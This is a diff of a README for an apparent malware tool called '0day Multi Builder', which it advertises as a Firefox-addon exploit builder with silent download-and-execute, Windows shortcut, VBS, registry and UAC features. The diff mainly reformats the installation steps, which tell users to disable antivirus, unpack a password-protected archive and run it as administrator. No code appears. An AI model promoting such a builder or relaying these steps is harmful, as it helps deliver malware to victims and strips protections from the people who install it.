@@ -1,29 +1,27 @@
 # 0day-Multi-Builder
 
 0day Multi Builder  is a straightforward exploit builder for Firefox addons that allows for silent download, execution, and use of Windows shortcuts.
+
+
 ![photo_2023-11-12_20-33-27](https://github.com/cloudx0r/0day-Multi-Builder/assets/107898938/2fcd7fa7-aa81-43e1-bff0-62ee6753fe30)
+
 
 Installation
 
-    Turn Off Antivirus
-    Extract files rar password: 0day
-    Right Click Run as Administrator
-    Go to realeases and download the )day Multi Builder
-    You're are good to go!
+    1. Turn Off Antivirus
+    2. Extract files rar password: 0day
+    3. Right Click Run as Administrator
+    4. Go to realeases and download the 0day Multi Builder
+    5. You're are good to go!
 
 Features
 
-    Download and Execute Exploit
-
-    Windows Shortcut EXploit
-
-    Using Vbs script
-
-    Using Reg
-
-    UAC Enable
-
-    Using Reg File
+    * Download and Execute Exploit
+    * Windows Shortcut EXploit
+    * Using Vbs script
+    * Using Reg
+    * UAC Enable
+    * Using Reg File
 
 Download and Execute Exploit
 
